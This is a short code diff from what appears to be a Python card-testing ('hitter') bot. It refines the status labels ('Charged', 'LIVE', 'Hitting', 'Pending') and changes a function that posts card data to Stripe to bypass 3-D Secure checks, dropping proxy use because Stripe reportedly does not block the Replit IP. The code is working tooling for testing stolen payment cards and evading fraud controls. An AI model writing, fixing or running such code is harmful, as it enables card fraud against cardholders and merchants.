@@ -2880,8 +2880,10 @@ async def _build_hit_status_text(merchant, price_str, success_url, cards, card_s
                 status_line = "Charged ✅"
         elif "LIVE" in raw:
             status_line = "LIVE 🔥"
-        elif "Hitting" in raw or "Pending" in raw:
+        elif "Hitting" in raw:
             status_line = "Hitting... ⏳"
+        elif "Pending" in raw:
+            status_line = "Pending ⏳"
         elif "Bypassing" in raw:
             status_line = "3DS → Bypassing... 🔐"
         elif "Declined" in raw or "DECLINED" in raw:
@@ -14142,9 +14144,9 @@ async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
             "Origin":         "https://js.stripe.com",
             "Referer":        "https://js.stripe.com/",
         }
+        # Call Stripe directly — never proxy (Stripe doesn't block Replit IP;
+        # HTTP proxies often can't tunnel HTTPS to api.stripe.com)
         kw = {"data": data, "headers": headers, "timeout": 30}
-        if proxy_url:
-            kw["proxies"] = {"http": proxy_url, "https": proxy_url}
         try:
             resp = _r.post(url, **kw)
             print(f"[bypass] HTTP {resp.status_code} — {resp.text[:300]}", flush=True)
